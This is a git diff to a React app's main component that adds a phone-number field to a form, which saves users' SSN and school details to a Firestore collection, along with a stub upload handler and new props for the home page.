@@ -9,9 +9,14 @@ import { collection, addDoc } from 'firebase/firestore'
 import { useNavigate } from 'react-router-dom'
 import FirstPage from './firstPage'
 import Checkout from './checkout'
+import { storage } from './firebaseconfig'
 
 function App() {
+  const [data, setData] = useState({})
 
+  const handleUpload = (file)=> {
+    console.log(data)
+  }
 
 
   const collectionRef = collection(database, 'users');
@@ -22,6 +27,7 @@ function App() {
     ssn:"",
     schoolName: "",
     schoolDate: "",
+    phoneNumber: "",
   });
 
   const [formData2, setFormData2] = useState({
@@ -62,9 +68,12 @@ function App() {
       ssn: formData.ssn,
       schoolDate: formData.schoolDate,
       schoolName: formData.schoolName,
+      phoneNumber: formData.phoneNumber,
       
     }).then(()=> {
+     
        navigate("success")
+      
     }).catch((err)=> {
       alert(err.message)
     })
@@ -87,7 +96,7 @@ function App() {
     <section>
      <Routes>
       
-      <Route index element={<HomePage handleSubmit={handleSubmit} getData={getData} />} />
+      <Route index element={<HomePage handleSubmit={handleSubmit} getData={getData} data={data} setData={setData}/>} />
       <Route path='success' element={<Success getData2={getData2} handleSubmit2={handleSubmit2}/>} />
       
      </Routes>
